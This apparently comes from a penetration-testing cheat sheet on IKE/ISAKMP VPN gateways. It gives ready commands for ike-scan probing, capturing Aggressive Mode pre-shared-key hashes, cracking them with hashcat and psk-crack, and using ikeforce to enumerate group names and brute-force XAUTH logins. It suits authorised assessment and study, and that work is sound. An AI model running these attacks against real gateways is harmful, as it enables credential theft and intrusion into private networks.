# IKE/ISAKMP (500, 4500)

!!! tip "Start here"
    Try Aggressive Mode first: `ike-scan -A 10.10.10.10`. If it responds, capture the PSK hash and crack offline with hashcat mode 5300/5400. Aggressive Mode + PSK is the main IKEv1 weakness — Main Mode doesn't expose the hash.

---

## Enumeration

```bash
sudo nmap -sU -p 500,4500 --script ike-version 10.10.10.10
```

---

## ike-scan

```bash
ike-scan 10.10.10.10              # basic probe — is IKE responding?
ike-scan -M 10.10.10.10           # Main Mode — transform fingerprint
ike-scan -A 10.10.10.10           # Aggressive Mode probe
```

---

## PSK Hash Capture (Aggressive Mode)

```bash
ike-scan -A -P ike_psk_params.txt 10.10.10.10
```

If the gateway requires a group name:
```bash
ike-scan -A --id=vpn -P ike_psk_params.txt 10.10.10.10
```

Crack offline:
```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike_psk_params.txt

hashcat -m 5300 ike_psk_params.txt /usr/share/wordlists/rockyou.txt   # MD5
hashcat -m 5400 ike_psk_params.txt /usr/share/wordlists/rockyou.txt   # SHA1
```

---

## Group ID / XAUTH Enumeration

On legacy Cisco VPN stacks, valid group names return different responses — enumerate them, then brute XAUTH:

```bash
python3 ikeforce.py 10.10.10.10 -e -w groupnames.txt
python3 ikeforce.py 10.10.10.10 -b -i <group-id> -k <psk> -U users.txt -w passwords.txt
```

!!! tip "Real-world"
    IKE on external assessments usually means a VPN gateway. Aggressive Mode is disabled on modern configurations, but legacy Cisco ASA and older Juniper/Checkpoint devices still have it enabled. Check both 500/udp and 4500/udp — 4500 is NAT-T and shows up when traffic passes through NAT.
